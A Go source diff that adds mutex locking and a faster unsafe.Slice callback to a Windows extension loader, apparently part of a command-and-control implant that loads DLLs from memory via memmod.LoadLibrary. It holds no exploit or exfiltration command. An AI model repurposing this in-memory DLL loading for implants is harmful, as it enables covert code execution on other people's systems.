@@ -19,8 +19,8 @@ package extension
 */
 
 import (
-	"bytes"
 	"errors"
+	"sync"
 	"syscall"
 	"unsafe"
 
@@ -43,6 +43,7 @@ type WindowsExtension struct {
 	arch     string
 	init     string
 	onFinish func([]byte)
+	sync.Mutex
 }
 
 // NewWindowsExtension - Load a new windows extension
@@ -71,6 +72,8 @@ func (w *WindowsExtension) Load() error {
 	if len(w.data) == 0 {
 		return errors.New("{{if .Config.Debug}} extension data is empty {{end}}")
 	}
+	w.Lock()
+	defer w.Unlock()
 	w.module, err = memmod.LoadLibrary(w.data)
 	if err != nil {
 		return err
@@ -114,6 +117,8 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 	// The extension API must respect the following prototype:
 	// int Run(buffer char*, bufferSize uint32_t, goCallback callback)
 	// where goCallback = int(char *, int)
+	w.Lock()
+	defer w.Unlock()
 	_, _, errNo := syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, callback)
 	if errNo != 0 {
 		return errors.New(errNo.Error())
@@ -126,14 +131,9 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 // so we can pass data back to the Go process from the loaded DLL
 func (w *WindowsExtension) extensionCallback(data uintptr, dataLen uintptr) uintptr {
 	outDataSize := int(dataLen)
-	outBuff := new(bytes.Buffer)
-	for i := 0; i < outDataSize; i++ {
-		b := (*byte)(unsafe.Pointer(uintptr(i) + data))
-		outBuff.WriteByte(*b)
-	}
-	//TODO: do something with outBuff
-	if outBuff.Len() > 0 {
-		w.onFinish(outBuff.Bytes())
+	outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
+	if dataLen > 0 {
+		w.onFinish(outBytes)
 	}
 	return Success
 }
